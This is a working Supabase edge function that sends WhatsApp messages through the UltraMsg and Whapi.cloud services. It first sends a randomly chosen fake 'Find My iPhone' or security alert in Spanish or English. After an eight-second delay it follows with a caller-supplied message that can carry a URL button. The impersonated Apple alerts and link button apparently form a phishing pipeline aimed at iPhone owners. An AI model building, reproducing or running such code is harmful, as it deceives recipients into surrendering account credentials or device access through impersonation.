import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.57.0';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Random ice-breaker alerts to "warm up" the chat via UltraMsg before Whapi sends
const iceBreakersEs = [
  "🔔 Alerta Find My iPhone: Se detectó actividad en tu dispositivo.",
  "⚠️ Alerta de seguridad: Nuevo inicio de sesión detectado.",
  "🛡️ Aviso de protección: Verificación de identidad requerida.",
  "📍 Alerta de ubicación: Tu dispositivo fue localizado.",
  "🔐 Notificación de seguridad: Actividad inusual detectada.",
  "🔎 Find My: Tu dispositivo está en línea.",
  "⚠️ Alerta del sistema: Revisión de seguridad pendiente.",
  "📱 Aviso importante: Se requiere verificación del dispositivo.",
];

const iceBreakersEn = [
  "🔔 Find My iPhone Alert: Activity detected on your device.",
  "⚠️ Security Alert: New login detected.",
  "🛡️ Protection Notice: Identity verification required.",
  "📍 Location Alert: Your device has been located.",
  "🔐 Security Notification: Unusual activity detected.",
  "🔎 Find My: Your device is online.",
  "⚠️ System Alert: Security review pending.",
  "📱 Important Notice: Device verification required.",
];

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    // Authenticate user
    const authHeader = req.headers.get('Authorization');
    if (!authHeader) {
      return new Response(JSON.stringify({ success: false, error: 'No authorization header' }), {
        status: 401,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const token = authHeader.replace('Bearer ', '');
    const { data: { user }, error: authError } = await supabase.auth.getUser(token);
    if (authError || !user) {
      return new Response(JSON.stringify({ success: false, error: 'Unauthorized' }), {
        status: 401,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const body = await req.json();
    const { number, message, button_text, button_url, language } = body;

    if (!number || !message) {
      return new Response(JSON.stringify({ success: false, error: 'Missing number or message' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // Get all needed settings: Whapi token + UltraMsg credentials
    const tokenKey = language === 'english' ? 'whapi_token_en' : 'whapi_token';
    const ultraInstanceKey = language === 'english' ? 'whatsapp_instance_en' : 'whatsapp_instance';
    const ultraTokenKey = language === 'english' ? 'whatsapp_token_en' : 'whatsapp_token';

    const { data: settings } = await supabase
      .from('system_settings')
      .select('setting_key, setting_value')
      .in('setting_key', [tokenKey, 'whapi_token', ultraInstanceKey, ultraTokenKey]);

    const settingsMap: Record<string, string> = {};
    settings?.forEach((s: { setting_key: string; setting_value: string | null }) => {
      settingsMap[s.setting_key] = s.setting_value || '';
    });

    const whapiToken = (settingsMap[tokenKey] || settingsMap['whapi_token'] || '').trim();

    if (!whapiToken) {
      return new Response(JSON.stringify({ success: false, error: 'Whapi.cloud token not configured' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // Clean phone number
    const cleanNumber = String(number).replace(/\D/g, '');

    // === STEP 1: Send ice-breaker via UltraMsg to warm up the chat ===
    const ultraInstance = settingsMap[ultraInstanceKey];
    const ultraToken = settingsMap[ultraTokenKey];

    if (ultraInstance && ultraToken) {
      const iceBreakers = language === 'english' ? iceBreakersEn : iceBreakersEs;
      const randomAlert = iceBreakers[Math.floor(Math.random() * iceBreakers.length)];

      console.log(`[ICE-BREAKER] Sending UltraMsg alert to ${cleanNumber}: "${randomAlert}"`);

      try {
        const ultraResponse = await fetch(`https://api.ultramsg.com/${ultraInstance}/messages/chat`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            token: ultraToken,
            to: cleanNumber,
            body: randomAlert,
          }),
        });
        const ultraResult = await ultraResponse.json();
        console.log('[ICE-BREAKER] UltraMsg response:', ultraResult);

        // Wait 8 seconds for the ice-breaker to arrive before sending Whapi
        console.log('[ICE-BREAKER] Waiting 8 seconds before Whapi send...');
        await delay(8000);
      } catch (e) {
        console.error('[ICE-BREAKER] UltraMsg failed (continuing with Whapi):', e);
        // Don't block Whapi send if ice-breaker fails
      }
    } else {
      console.log('[ICE-BREAKER] UltraMsg credentials not found, skipping ice-breaker');
    }

    // === STEP 2: Send the actual message via Whapi ===
    let result;

    if (button_text && button_url) {
      console.log(`Sending interactive button message to ${cleanNumber}`);
      const response = await fetch('https://gate.whapi.cloud/messages/interactive', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${whapiToken}`,
        },
        body: JSON.stringify({
          to: cleanNumber,
          type: 'button',
          body: { text: message },
          action: {
            buttons: [
              {
                id: 'btn_1',
                type: 'url',
                title: button_text,
                url: button_url,
              },
            ],
          },
        }),
      });
      result = await response.json();
      console.log('Whapi interactive response:', result);
    } else {
      console.log(`Sending text message to ${cleanNumber}`);
      const response = await fetch('https://gate.whapi.cloud/messages/text', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${whapiToken}`,
        },
        body: JSON.stringify({
          to: cleanNumber,
          body: message,
        }),
      });
      result = await response.json();
      console.log('Whapi text response:', result);
    }

    if (result.message_id || result.sent === true) {
      return new Response(JSON.stringify({ success: true, message_id: result.message_id }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    } else {
      return new Response(JSON.stringify({ success: false, error: result.error?.message || result.message || 'Unknown Whapi error' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }
  } catch (error: unknown) {
    console.error('Error in send-whapi:', error);
    const err = error instanceof Error ? error : new Error(String(error));
    return new Response(JSON.stringify({ success: false, error: err.message }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
